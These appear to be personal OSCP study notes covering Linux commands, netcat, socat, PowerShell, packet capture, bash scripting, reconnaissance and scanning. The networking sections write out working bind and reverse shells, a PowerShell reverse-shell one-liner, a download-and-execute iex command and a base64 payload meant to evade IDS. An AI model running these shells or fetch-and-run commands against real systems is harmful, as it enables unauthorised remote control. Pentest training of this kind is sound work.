# OSCP Notes
Additional references:
https://oscp.infosecsanyam.in/
https://sushant747.gitbooks.io/total-oscp-guide/content

## Basic Linux
### Linux Folders Reference
![](https://i.imgur.com/O7jh1bS.png)

**Tip: The following can be written in by other users, don't have to be root!!**
Linux:
```
/tmp
/var/tmp
/dev/shm
/var/spool/vbox
/var/spool/samba
```
Windows:
```
# list from https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md
C:\Windows\Tasks
C:\Windows\Temp
C:\windows\tracing
C:\Windows\Registration\CRMLog
C:\Windows\System32\FxsTmp
C:\Windows\System32\com\dmp
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\PRINTERS
C:\Windows\System32\spool\SERVERS
C:\Windows\System32\spool\drivers\color
C:\Windows\System32\Tasks\Microsoft\Windows\SyncCenter
C:\Windows\System32\Tasks_Migrated (after peforming a version upgrade of Windows 10)
C:\Windows\SysWOW64\FxsTmp
C:\Windows\SysWOW64\com\dmp
C:\Windows\SysWOW64\Tasks\Microsoft\Windows\SyncCenter
C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System
```
### To find a file
```
find / -name 
```
### Search for command
```
man -k / apropos 
```
### Redirect to files
```
> left side send to right side (file)
< right side (file) send to left side (command)
0 STDIN
1 STDOUT
2 STDERR (use as “2>” to send only error message to right side (file))
```
### Piping commands
```
| - output of left side is input of right
> STD
```
### Searching for text in multiple files in a directory
```
grep -rnw ‘PATH’ -e ‘pattern’
```
- wildcard * means zero or more occurrences of the previous character. e.g. -
```
grep -rnw ‘/home/student/access-logs’ -e OS{*
```
### Extract section of text from a line
e.g. list of users extracted from /etc/passwd by using : as a delimiter and retrieving the first field
```
cut -d “:” -f 1 /etc/passwd
```
- Similar to `awk`
- `cut` can only accept a single character as a field delimiter, while `awk` is much more flexible
```
echo "hello::there::friend" | awk -F "::" '{print $1, $3}'
```
This will give you `hello friend`.

More examples:
```
cat /etc/passwd | grep -rnw -e '/bin/false' | awk -F ":" '{print "The user "$3 " home directory is "$8}'
```
This gives:
```
The user mysql home directory is /nonexistent
The user tss home directory is /var/lib/tpm
The user Debian-snmp home directory is /var/lib/snmp
The user speech-dispatcher home directory is /run/speech-dispatcher
The user lightdm home directory is /var/lib/lightdm
```

### To find difference between files
```
diff -c(or -u) file1.txt file2.txt
```
`-c` is context format and `-u` is unified format.

Use `vimdiff file1.txt file2.txt` for visual comparison
### Background processes
- Append `&` to the end of the command
- If process is running, `Ctrl+Z` to suspend, and resume in the background using `bg`
- `jobs` to view (suspended) batch jobs
- `fg %1` command is new. There are various ways to refer to a job in the shell. The `%` character followed by a JobID represents a job specification. The JobID can be a process ID (PID) number or you can use one of the following symbol combinations:
    - %Number : Refers to a job number such as %1 or %2
    - %String : Refers to the beginning of the suspended command's name such as `%commandNameHere` or `%ping`
    - %+ OR %% : Refers to the current job
    - %- : Refers to the previous job
### Search for process
```
ps -fC <name>
```
### Monitor log file entries as they are being written
```
sudo tail -f /var/log/apache2/access.log
```
or `-nX` which outputs the last X number of lines instead of default of 10
### Run a command at regular intervals
```
watch -n 5 w 
```
This command lists logged-in users (via the w command) once every 5 secs
### Download files using HTTP/HTTPS/FTP/SSH
```
wget -O (to change name) <URL>
```
```
axel -a -n 20 -o (name) <URL>
```
`-n` to download through multiple connections

To transfer data to or from a server:
```
curl -O (to change name) <URL>
```
Via SSH:
```
scp -P <port> user@ip:filedir/file.txt /destinationdir
```
```
ftp passive
ftp binary
ftp put <file>
```
### Bash history
To filter out commands:
```
export HISTIGNORE="&:ls:[bf]g:exit:history"
```
To include date/time stamps in the output of `history`:
```
export HISTTIMEFORMAT='%F %T '
```
### Custom Commands
```
alias lsa='ls -la'
```
- `unalias <command>` to remove
- Edit `~/.bashrc` file for persistent bash customisation

### Compiling C Source Code
```
gcc <file.c> -o <exploit>
```
Use `chmod +x <file>` to enable execution of file.

---
## Networking Tools
### Netcat
#### Connecting to TCP/UDP port
```
nc -nv 10.11.0.22 110
````
`-n` option to skip DNS name resolution; `-v` to add some verbosity; the destination IP address; and the destination port number
#### Listening on TCP/UDP port
(On a WIN platform)  Opening a listening port on 4444
```
nc -nlvp 4444
```
`-n` option to disable DNS name resolution, `-l` to create a listener, `-v` to add some verbosity, and `-p` to specify the listening port number:
- Use `nc -nv <IP>` to connect to the same port, then the WIN and LINUX machines can communicate

#### Transferring files
(On WIN) Open port 4444 and pipe into `incoming.exe`
```
nc -nlvp 4444 > incoming.exe
```
(On LINUX) Send `wget.exe` to IP and port 444
```
nc -nv 10.11.0.22 4444 < /usr/share/windows-resources/binaries/wget.exe
```
#### Remote administration - Bind shell scenario
(On WIN - Victim) Open port 4444 and bind `cmd.exe` to TCP port 4444
For anyone connecting, WIN will allow control of `cmd.exe`
```
nc -nlvp 4444 -e cmd.exe
```
(On LINUX - Attacker) Connect to 4444 and control `cmd.exe`
```
nc -nv 10.11.0.22 4444
```
#### Remote administration - Reverse shell scenario
(On WIN - Attacker) Open a listening port
```
nc -nlvp 4444
```
(On LINUX - Victim) Linux sending control of terminal to 4444
```
nc -nv 10.11.0.22 4444 -e /bin/bash
```
Upgrading a non-interactive shell
```
python -c 'import pty; pty.spawn("/bin/bash")'
```



### Netcat vs Socat
Outbound connection
```
nc <remote server's ip address> 80
socat - TCP4:<remote server's ip address>:80
```
Open listening port
```
sudo nc -lvp localhost 443
sudo socat TCP4-LISTEN:443 STDOUT
```
### Socat

**Note**: If you want to use `socat` on WINDOWS, you can install the package, and use Cygwin. You can follow this: http://pioneertools.blogspot.com/2018/01/how-to-install-socat-network-utility.html

Or perhaps use the Ubuntu from the Windows Store. You are required to install `wsl` and allow virtualisation of your machine.

You also need to install the OPENSSL package if you want to use encryption. More info on OPENSSL package for Cygwin: 
https://cygwin.com/packages/summary/openssl-src.html
https://www.ssl.com/how-to/install-openssl-on-windows-with-cygwin/#ftoc-heading-1

#### Transferring files
(On LINUX, hosting file on 443) 
```
sudo socat TCP4-LISTEN:443,fork file:secret_passwords.txt
```
(On WIN, downloading file on 443) 
```
socat TCP4:10.11.0.4:443 file:received_secret_passwords.txt,create
```
#### Remote administration 
Good reference: https://erev0s.com/blog/encrypted-bind-and-reverse-shells-socat/
#### Reverse shell scenario
(On WIN - Attacker) Open a listening port
```
socat -d -d TCP4-LISTEN:443 STDOUT
```
(On LINUX - Victim) Sending control of terminal to 443
```
socat TCP4:10.11.0.22:443 EXEC:/bin/bash
```

#### Encrypted bind shell (SSL)
*See "Creating self-signed cert" on how to create SSL cert*

(On LINUX - Victim) `.pem` needs to be in victim machine for bind shell
```
sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash
```
If a WIN Victim:
```
socat OPENSSL-LISTEN:443,cert=bind.pem,verify=0,fork EXEC:'cmd.exe',pipes
```
(On WIN - Attacker) 
```
socat - OPENSSL:10.11.0.4:443,verify=0
```
Use `-` to transfer data between `STDIO3` and the remote host, `OPENSSL` to establish a remote SSL connection to Alice's listener on 10.11.0.4:443, and `verify=0` to disable SSL certificate verification.

### **Creating self-signed cert (for socat)*
**Note:** To install on windows, remember to add a new system variable and update PATH.
https://thesecmaster.com/procedure-to-install-openssl-on-the-windows-platform/

req: initiate a new certificate signing request
- newkey: generate a new private key

rsa:2048: use RSA encryption with a 2,048-bit key length.
- nodes: store the private key without passphrase protection
- keyout: save the key to a file
- x509: output a self-signed certificate instead of a certificate request
- days: set validity period in days
- out: save the certificate to a file

Example:
```
openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt
```
If want a quick way without filling in some details:
```
openssl req -newkey rsa:2048 -nodes -keyout bind.key -x509 -days 1000 -subj '/CN=www.mydom.com/O=My Company Name LTD./C=US' -out bind_shell.crt
```
This will create `bind_shell.key` and `bind_shell.crt`. We first need to convert them to a format `socat` will accept. To do so, we combine both the `bind_shell.key` and `bind_shell.crt` files into a single `.pem` file before we create the encrypted `socat` listener.
```
cat bind_shell.key bind_shell.crt > bind_shell.pem
```

### PowerShell
Use this in command prompt of WINDOWS.
#### File Transfers
Example (from LINUX to WIN), in WIN command prompt:
```
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://192.168.45.242/OrcaMDF.Framework.dll','C:\Users\Administrator\Desktop\OrcaMDF.Framework.dll')"
```
First, we used the -c option. This will execute the supplied command (wrapped in double-quotes) as if it were typed at the PowerShell prompt.

The command we are executing contains several components. First, we are using the "new-object" cmdlet, which allows us to instantiate either a .Net Framework or a COM object. In this case, we are creating an instance of the WebClient class, which is defined and implemented in the System.Net namespace. The WebClient class is used to access resources identified by a URI and it exposes a public method called DownloadFile, which requires our two key parameters: a source location (in the form of a URI as we previously stated), and a target location where the retrieved data will be stored.

#### Reverse Shells
On LINUX (attacker), open a listener
```
sudo nc -lnvp 443
```
On WIN (victim), run script in command prompt to send control over:
```
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.119.165',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
**Note**: IP and port number is of victim

You can copy-and-paste this type of command (replacing the IP and port number) during a live penetration test.
#### Bind Shells
On WIN (victim), open a listener on command prompt using powershell
```
powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
```
On LINUX (attacker), connect to the bind shell
```
nc -nv 10.11.0.22 443
```
### Powercat
Powershell version of Netcat. (Use this in PowerShell for WINDOWS)

**Note:** Powercat can be installed in Kali with `apt install powercat`, which will place the script in `/usr/share/windows-resources/powercat`.

With the script on the target host, we start by using a PowerShell feature known as Dot-sourcing3 to load the `powercat.ps1` script. This will make all variables and functions declared in the script available in the current PowerShell scope. In this way, we can use the powercat function directly in PowerShell instead of executing the script each time.
```
. .\powercat.ps1
```
If the target machine is connected to the Internet, we can do the same with a remote script by once again using the handy iex cmdlet as follows:
```
iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
```
Scripts loaded this way will only be available in the current PowerShell instance. 

Once script is loaded, can directly use `powercat` command in command prompt.
#### File Transfers
On LINUX (receipient), can use `nc`
```
sudo nc -lnvp 443 > receiving_powercat.ps1
```
On WIN, send `powercat.ps1` to IP and 443
```
powercat -c 10.11.0.4 -p 443 -i C:\Users\Offsec\powercat.ps1
```
#### Reverse Shells
Similar to `nc`

On LINUX (attacker), open listener
```
sudo nc -lvp 443
```
On WIN (victim), send cmd.exe over
```
powercat -c 10.11.0.4 -p 443 -e cmd.exe
```
#### Bind Shells
On WIN (victim), open listener with cmd.exe
```
powercat -l -p 443 -e cmd.exe
```
On LINUX (attacker), create `nc` connection
```
nc 10.11.0.22 443
```
#### Stand-Alone Payloads
Use the `-g` option to convert the `powercat` command into a executable payload. E.g.
```
powercat -c 10.11.0.4 -p 443 -e cmd.exe -g > reverseshell.ps1

./reverseshell.ps1
```
**Note:** It is easily detectable by IDS because it's in plaintext.

We can try to overcome this by using Base64 encoded commands using `-ge`
```
powercat -c 10.11.0.4 -p 443 -e cmd.exe -ge > encodedreverseshell.ps1
```
To execute this, we need to pass the whole encoded string (contained in `encodedreverseshell.ps1`) to `powershell.exe -E`
```
powershell.exe -E ZgB1AG4AYwB0AGkAbwBuACAAUwB0AHIAZQBhAG0AMQBfAFMAZQB0AHUAcAAKAHsACgAKACAAIAAgACAAcABhAHIAYQBtACgAJABGAHUAbgBjAFMAZQB0AHUAcABWAGEAcgBzACkACgAgACAAIAAgACQAYwAsACQAbAAsACQAcAAsACQAdAAgAD0AIAAkAEYAdQBuAGMAUwBlAHQAdQBwAFYAYQByAHMACgAgACAAIAAgAGkAZgAoACQAZwBsAG8AYgBhAGwAOgBWAGUAcgBiAG8AcwBlACkAewAkAFYAZQByAGIAbwBzAGUAIAA9ACAAJABUAHIAdQBlAH0ACgAgACAAIAAgACQARgB1AG4AYwBWAGEAcgBzACAAPQAgAEAAewB9AAoAIAAgACAAIABpAGYAKAAhACQAbAApAAoAIAAgACAAIAB7AAoAIAAgACAAIAAgACAAJABGAHUAbgBjAFYAYQByAHMAWwAiAGwAIgBdACAAPQAgACQARgBhAGwAcwBlAAoAIAAgACAAIAAgACAAJABTAG8AYwBrAGUAdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAGMAcABDAGwAaQBlAG4AdAAKACAAIAAgACA
```
### Wireshark
#### Capture Filter
Select the interface we would like to monitor and entering a capture filter. In this case, we use the net filter1 to only capture traffic on the 10.11.1.0/24 address range:
![](https://i.imgur.com/e1QbVMQ.png)
It is also possible to choose from predefined capture filters by navigating to Capture > Capture filters, and we can also add our own capture filters by clicking on the + sign. With the capture filter set, we can start the capture by double-clicking our network interface (tap0) from the list of available interfaces.
#### Display Filter
Display filters are much more flexible than capture filters and have a slightly different syntax. Display filters will, as the name suggests, only filter the packets being displayed while Wireshark continues to capture all network traffic for the 10.11.1.0/24 address range in the background.
#### Following TCP Streams
We can make use of Wireshark's ability to reassemble a specific session and display it in various formats. To view a particular TCP stream, we can right-click a packet of interest, such as the one containing the USER command in our FTP session, then select Follow > TCP Stream:
![](https://i.imgur.com/JvfUo7H.png)
![](https://i.imgur.com/Hk9Aqxf.png)

### TCPdump
#### Opening `.pcap` File:
```
sudo tcpdump -r password_cracking_filtered.pcap
```
#### Capturing Traffic
You can use enable capture filters when live capturing packets. E.g. capture packets from port 110 from any interface:
```
tcpdump -i any port 110 -nX
```
`-i` option is to select the interface of which to capture the packets
`-n` option is to off conversion of IP addresses into hostnames
`-X` option is to display contents of packet
#### Filtering Traffic 
`-n` option to skip DNS name lookups and `-r` to read from our packet capture file. Then, we can pipe the output into `awk`, printing the destination IP address and port (the third space-separated field) and pipe it again to sort and uniq `-c` to sort and count the number of times the field appears in the capture, respectively. Lastly we use `head` to only display the first 10 lines of the output:
```
sudo tcpdump -n -r password_cracking_filtered.pcap | awk -F " " '{print $5}' | sort | uniq -c | head

  20164 172.16.40.10.81:
     14 208.68.234.99.32768:
     14 208.68.234.99.32769:
      6 208.68.234.99.32770:
     14 208.68.234.99.32771:
      6 208.68.234.99.32772:
      6 208.68.234.99.32773:
     15 208.68.234.99.32774:
     12 208.68.234.99.32775:
      6 208.68.234.99.32776:
```
We can see that 172.16.40.10 was the most common destination address followed by 208.68.234.99. Given that 172.16.40.10 was contacted on a low destination port (81) and 208.68.234.99 was contacted on high destination ports, we can rightly assume that the former is a server and the latter is a client.

In order to filter from the command line, we will use the source host (src host) and destination host (dst host) filters to output only source and destination traffic respectively. We can also filter by port number (-n port 81) to show both source and destination traffic against port 81.
```
sudo tcpdump -n src host 172.16.40.10 -r password_cracking_filtered.pcap
...
08:51:20.801051 IP 172.16.40.10.81 > 208.68.234.99.60509: Flags [S.], seq 4166855389, ack 1855084075, win 14480, options [mss 1460,sackOK,TS val 71430591 ecr 25538253,nop,wscale 4], length 0
08:51:20.802053 IP 172.16.40.10.81 > 208.68.234.99.60509: Flags [.], ack 89, win 905, options [nop,nop,TS val 71430591 ecr 25538253], length 0
...
sudo tcpdump -n dst host 172.16.40.10 -r password_cracking_filtered.pcap
...
08:51:20.801048 IP 208.68.234.99.60509 > 172.16.40.10.81: Flags [S], seq 1855084074, win 14600, options [mss 1460,sackOK,TS val 25538253 ecr 0,nop,wscale 7], length 0
08:51:20.802026 IP 208.68.234.99.60509 > 172.16.40.10.81: Flags [.], ack 4166855390, win 115, options [nop,nop,TS val 25538253 ecr 71430591], length 0
...
sudo tcpdump -n port 81 -r password_cracking_filtered.pcap
...
08:51:20.800917 IP 208.68.234.99.60509 > 172.16.40.10.81: Flags [S], seq 1855084074, win 14600, options [mss 1460,sackOK,TS val 25538253 ecr 0,nop,wscale 7], length 0
08:51:20.800953 IP 172.16.40.10.81 > 208.68.234.99.60509: Flags [S.], seq 4166855389, ack 1855084075, win 14480, options [mss 1460,sackOK,TS val 71430591 ecr 25538253,nop,wscale 4], length 0
...
```
#### Reading Captured Traffic
`-X` to print packet data in HEX and ASCII
```
sudo tcpdump -nX -r password_cracking_filtered.pcap
```
`-w` to write to `.pcap`
#### Advanced Header Filtering
TCP Header (1 byte = 8 bits, TCP flags start from 14th byte):
![](https://i.imgur.com/REcg01W.png)
To filter by the bytes/bits, example to see ACK and PSH bits:
```
sudo tcpdump -A -n 'tcp[13] = 24' -r password_cracking_filtered.pcap
```
**Note:** All packets sent and received after the initial 3-way handshake will have the ACK flag set. The PSH flag is used to enforce immediate delivery of a packet and is commonly used in interactive Application Layer protocols to avoid buffering.

`tcp[13] = 24` = 14th byte, with ACK and PSH bits turned on (00011000 = 24)

----
## Bash Scripting
1. Starts with `#!/bin/bash`
2. Executable permissions set
```
chmod +x hello-world.sh
```
3. Usually named `.sh`
4. `./xxx.sh` runs the `xxx.sh` script in the current directory `./`
### Variables
1. Use `$` to reference variables
2. Use quotes `""` for strings with spaces (or commands)
**Note:** Use `unset` to remove the defined variable

![](https://i.imgur.com/nhe4eSK.png)
3. `read` to receive user input (and assign to a variable)
`-p` option allows us to specify the prompt
`-s` option makes user input silent

Example:
```
read -p 'Username: ' username
read -sp 'Password: ' password

echo "Your username is $username and your password is $password"
```
#### If, Else, Elif
```
if test <test>
then
    <action/command>
elif test <test>
then
    <action/command>
else
    <action/command>
fi
```
Can also use `[]`
```
if [ <test> ]
then
    <action/command>
elif test <test>
then
    <action/command>
else
    <action/command>
fi
```
![](https://i.imgur.com/kEboLMo.png)
### Boolean
#### `&&` - AND operator
Executes the command only if the previous command returns `True`
```
grep $user2 /etc/passwd && echo "$user2 found!"
kali:x:1000:1000:,,,:/home/kali:/bin/bash
kali found!
```
#### `||` - OR operator 
Executes the command only if the previous command returns `False`
```
grep $user2 /etc/passwd && echo "$user2 found!" || echo "$user2 not found!"
bob not found!
```
3. Can be used with `test` to test multiple conditions
### Loops
#### For Loops
```
for <variable> in <list>
do
    <action/command>
done
```
For example, using `seq` to print a sequence of numbers:
```
for ip in $(seq 1 10); do echo 10.11.1.$ip; done
10.11.1.1
10.11.1.2
10.11.1.3
10.11.1.4
10.11.1.5
10.11.1.6
10.11.1.7
10.11.1.8
10.11.1.9
10.11.1.10
```
Can be useful to run port scans `nmap` and `ping`.
#### While Loops
```
while test <test>
do
    <action/command>
done
```
Example:
```
kali@kali:~$ cat ./while2.sh
#!/bin/bash
# while loop example 2

counter=1

while [ $counter -le 10 ]
do
  echo "10.11.1.$counter"
  ((counter++))
done

kali@kali:~$ chmod +x ./while2.sh

kali@kali:~$ ./while2.sh 
10.11.1.1
10.11.1.2
10.11.1.3
10.11.1.4
10.11.1.5
10.11.1.6
10.11.1.7
10.11.1.8
10.11.1.9
10.11.1.10
```
### Functions
#### Formats of functions:
1.

```
function function_name{
<commands>
}
```
2.
```
function_name () {
<commands>
}
```
#### Passing Arguments
Example of passing arguments to a function:
```
kali@kali:~$ cat ./funcarg.sh
#!/bin/bash
# passing arguments to functions

pass_arg() {
  echo "Today's random number is: $1"
}

pass_arg $RANDOM

kali@kali:~$ chmod +x ./funcarg.sh 

kali@kali:~$ ./funcarg.sh 
Today's random number is: 25207
```
*Remember that `$1` is the first argument.*

#### Returning Values
Example of returning values from function:
```
kali@kali:~$ cat funcrvalue.sh
#!/bin/bash
# function return value example

return_me() {
  echo "Oh hello there, I'm returning a random value!"
  return $RANDOM
}

return_me

echo "The previous function returned a value of $?"

kali@kali:~$ chmod +x ./funcrvalue.sh 

kali@kali:~$ ./funcrvalue.sh 
Oh hello there, I'm returning a random value!
The previous function returned a value of 198
```
*Remember that `$?` is the exit status of the last run process.*

#### Variable Scope
By default, a variable has a global scope, meaning it can be accessed throughout the entire script. In contrast, a local variable can only be seen within the function, block of code, or subshell in which it is defined. We can "overlay" a global variable, giving it a local context, by preceding the declaration with the local keyword, leaving the global variable untouched. The general syntax is:
```
local name="Joe"
```
Misc (extracting `.js` filenames that are unique and sorted, without filepath or extension):
```
cat $1 | grep -hoE "[^/]+\.js" | awk -F\/ '{print $NF}' | sort | uniq
```

-----
## Passive Information Gathering
### Website Recon
- Can obtain information from browsing the website
    - Email addresses
    - Contacts' First Name, Last Name
    - Etc
### Whois
`whois` is a TCP service, tool, and a type of database that can provide information about a domain name, such as the name server and registrar. This information is often public since registrars charge a fee for private registration.

Forward lookup:
```
whois <domain name>
```
or you can use the following for reverse lookup:
```
whois <IP address>
```
The results of the reverse lookup gives us information on who is hosting the IP address.

### Recon-ng
- `recon-ng` is a module-based framework for web-based information gathering
- `marketplace search` to search for modules in `recon-ng`
**Note:** `*` means the modules require credentials or API keys. The `recon-ng` wiki maintains a short list of keys used by its module
- `marketplace info <module>` gives more info about the module
- `marketplace install <module>` installs the module
- `modules load <module>` loads the module
- `show hosts` to show stored data

### Searching Websites
#### Google Hacking
Uses search strings and operators.
- `site:` restricts searches to a single domain
- `filetype:` or `ext:` restricts searches to a single filetype
    - Searches like `ext:jsp`, `ext:cfm`, `ext:pl` will find indexed Java Server Pages, Coldfusion, and Perl pages respectively.
- Use `-` to exclude instead of include, e.g. `-filetype:php` to exclude `php` files
- `intitle:` restricts searches to words found in the title of the page
    - `intitle:"index of" "parent directory"` finds pages with "index of" in its title and "parent directory" in the page

Resource for search operators:
https://www.exploit-db.com/google-hacking-database
https://ahrefs.com/blog/google-advanced-search-operators/
#### Open-Source Code
Some information resides on online repos or open-source projects. You can use google search operators for some platform search bars. Or you can automate the searching using Gitrob and Gitleaks.

#### Pastebin
A website for storing and sharing text. The site doesn't require an account for basic usage. Many people use Pastebin because it is ubiquitous and simple to use. But since Pastebin is a public service, we can use it to search for sensitive information.
https://pastebin.com/

### Third Party Scanners
#### Netcraft
Free web portal that performs various information gathering functions.
https://searchdns.netcraft.com
#### Shodan
A search engine that crawls devices connected t othe internet including but not limited to the World Wide Web. Includes web servers and devices like routers and IoT devices. It's still passive information gathering without interacting with the clients' websites.
https://www.shodan.io/

You can search using the search operators too, e.g. `hostname:megacorpone`
#### Security Headers Scanner
https://securityheaders.com/
Analyses HTTP response headers.
#### SSL Server Test
https://www.ssllabs.com/ssltest/
Analyses a server's SSL/TLS configuration and compares it against current best practices. Also uncovers related vulnerabilities.

### User Information Gathering
Good to search for user/employee information apart from company information. The purpose for gathering this information is to compile user or password lists, build pretexting for social engineering, augment phishing campaigns or client-side attacks, execute credential stuffing, and much more. 
#### Email Harvesting
`theHarvester` gathers emails, names, subdomains, IPs, and URLs from public data sources. Example:
```
theHarvester -d megacorpone.com -b google
```
`-d` specifies target domain
`-b` specifies data source
#### Password Dump
Use wordlists or password dumps on Pastebin for user enumeration.
### Social Media Tools
#### Social-Searcher
Search engine for social media sites. 
https://www.social-searcher.com/
#### Twofi
Scans Twitter feed and generates a personalised wordlist for password attackers. Requires Twitter API key.
https://digi.ninja/projects/twofi.php
#### linkedin2username
Generates username lists based on LinkedIn data. Requires valid linkedIn credentials and depends on a LinkedIn connection to individuals in the target organisation.
https://github.com/initstring/linkedin2username
### Stack Overflow
If we can reasonably determine a user on Stack Overflow is also an employee of our target organization, we may be able to infer some things about the organization based on the employee's questions and answers.

For example, if we found a user that is always asking and answering questions about Python, it would be reasonable to assume they use that programming language on a daily basis, and it would likely be used at the organization where they are employed.

Even worse, if we find employees discussing sensitive information such as vulnerability remediation on these types of forums, we could discover unpatched vulnerabilities during this phase.
### Information Gathering Frameworks
#### OSINT Framework
https://osintframework.com/
#### Maltego
Poewrful data mining tool that searches many online data sources to "transform" one piece of information into another. Maltego CE is included in Kali and requries a free registration to use.
https://www.paterva.com/buy/maltego-clients.php

## Active Information Gathering

### AutoRecon
https://github.com/Tib3rius/AutoRecon

### DNS Enumeration
- NS - Nameserver records contain the name of the authoritative servers hosting the DNS records for a domain.
- A - Also known as a host record, the "a record" contains the IP address of a hostname (such as www.megacorpone.com).
- MX - Mail Exchange records contain the names of the servers responsible for handling email for the domain. A domain can contain multiple MX records.
- PTR - Pointer Records are used in reverse lookup zones and are used to find the records associated with an IP address.
- CNAME - Canonical Name Records are used to create aliases for other host records.
- TXT - Text records can contain any arbitrary data and can be used for various purposes, such as domain ownership verification.
```
host -t <DNS field> <domain name>

e.g. host -t mx megacorpone.com
```
#### Forward Lookup Brute Force
Using a list of possible hostnames, use a `for` loop to automate the `host` command with a bash script to resolve each hostname. Example:
```
for ip in $(cat list.txt); do host $ip.megacorpone.com; done
```
More wordlists can be installed to `/usr/share/seclists` using `sudo apt install seclists`
#### Reverse Lookup Brute Force
To find hostnames using IP addresses in a range (for PTR records only). Similarly, it can be automated with a bash script. Example:
```
for ip in $(seq 50 100); do host -t PTR $ip.38.100.193; done | grep -v "not found"
```
This scans 193.100.38.50 to 193.100.38.100 and shows entries that do not contain "not found".
**Note:** Forward and reverse lookups are cyclical and can expand your search based on the results.

#### DNS Zone Transfer
Unauthorised replicating of zone files for all DNS records in that zone.
```
host -l <domain name> <dns server address>
```
Some larger organizations might host many DNS servers, or we might want to attempt zone transfer requests against all the DNS servers in a given domain. Bash scripting can help with this task.
1. Find the name servers of the domain
2. Run the above command

**Note**: You would need the ip and domain added to your `/etc/hosts` file OR the IP as a nameserver in your `/etc/resolv.conf` file for name resolution

Just use `dig`:
```
dig axfr @<IP> <domain name>
```
Try others from this resource: https://book.hacktricks.xyz/network-services-pentesting/pentesting-dns#zone-transfer
#### DNSRecon
1. Zone Transfer
```
dnsrecon -d <domain name> -t axfr
```

Similarly, you need to edit the `hosts` file or `resolv.conf` file for name resolution

2. Brute Force Hostnames
```
dnsrecon -d <domain name> -D ~/list.txt -t brt
```
`list.txt` contains a list of possible hostnames

#### DNSEnum
```
dnsenum <domain name>
```

### Port Scanning
#### TCP/UDP Scanning
Using `nc` is a rudimentary way to do so. TCP scan example:
```
nc -nvv -w 1 -z 10.11.1.220 3388-3390
```
`-w` option specifies the connection timeout in seconds
`-z` is used to specify zero-I/O mode, which will send no data and is used for scanning
```
nc -nv -u -z -w 1 10.11.1.115 160-162
```
`-u` indicates a UDP scan
UDP scans may be unreliable - false positives. Firewalls may drop ICMP packets leading to UDP scans to return open when it is closed.
#### Nmap
![](https://i.imgur.com/5FfsZ1w.png)

1. `-sS` Stealth / SYN Scan (defualt `nmap` scan)
2.  `-sT` TCP Connect Scan (if no raw socket privileges)
3. `-sU` UDP Scan **SCAN FOR UDP IF TCP YIELDS NOTHING**
4. `-sn` Network Sweep to discover hosts
---

1. Use both `-v` for verbosity and `-oG` to save results in a greppable format.
2. `-p` to scan specific ports
3. `--top-ports=20` to scan top 20 ports
```
nmap -sT -A --top-ports=20 10.11.1.1-254 -oG top-port-sweep.txt
```
The top twenty nmap ports are determined using the /usr/share/nmap/nmap-services file.

4. `-A` to enable OS version detection, script scanning and traceroute
5. `-O` to enable OS fingerprinting (based on inspected packets)
6. `-sV` to inspect service banners (use with `-A`)
7. Determine what services the machine has exposed to the network:
```
sudo nmap 10.11.0.128 -p- -sV -vv -A --open --reason

sudo nmap -pXX -sC -sT -Pn <IP>
```
Can also try 
```
sudo nmap -sC -sS -p0-65535 <IP Address>
```
Simple ping sweep script to discover live hosts:
```
for /L %i in (1,1,255) do @ping -n 1 -w 200 10.5.5.%i > nul && echo 10.5.5.%i is up.
```

---
NSE scripts are located in `/usr/share/nmap/scripts`

Useful scripts:
- `smb-os-discovery` attempts to connect to the SMB service on a target system and determine its operating system
```
nmap 10.11.1.220 --script=smb-os-discovery
```
- `dns-zone-transfer` can be used too
```
nmap --script=dns-zone-transfer -p 53 ns2.megacorpone.com
```

If `nmap` is not available on the host (e.g. compromised machine), a simple script can suffice:
```
#!/bin/bash
host=10.5.5.11
for port in {1..65535}; do
    timeout .1 bash -c "echo >/dev/tcp/$host/$port" &&
        echo "port $port is open"
done
echo "Done"
```
Upload to target machine:
```
upload /home/kali/portscan.sh /tmp/portscan.sh
```
#### Masscan
Can be used to scan subnets. Fastest port scanner around. Example (with options):
```
sudo masscan -p80 10.11.1.0/24 --rate=1000 -e tap0 --router-ip 10.11.0.1
```

### SMB Enumeration
#### NetBIOS

is an independent session layer protocol and service that allows computers on a local network to communicate with each other. While modern implementations of SMB can work without NetBIOS, NetBIOS over TCP (NBT)2 is required for backward compatibility and is often enabled together. For this reason, the enumeration of these two services often goes hand-in-hand.

You can use `nmap` smb scripts:
- `smb-os-discovery`
- `smb-vuln*` script to search for vulnerabilities, e.g.:
```
nmap -v -p 139,445 --script=smb-vuln* --script-args=unsafe=1 10.11.1.5
```
**Note::** NetBIOS listens on 139, and SMB on 445, for reasons stated above.

Or `nbtscan`:

```
sudo nbtscan -r 10.11.1.0/24
```
`-r` option used to specify the origin UDP port as 137 which is used to query the NetBIOS name service.

Or `enum4linux`.

https://benleeyr.wordpress.com/2022/02/08/metasploit-6-smb-encryption-error-fixing/
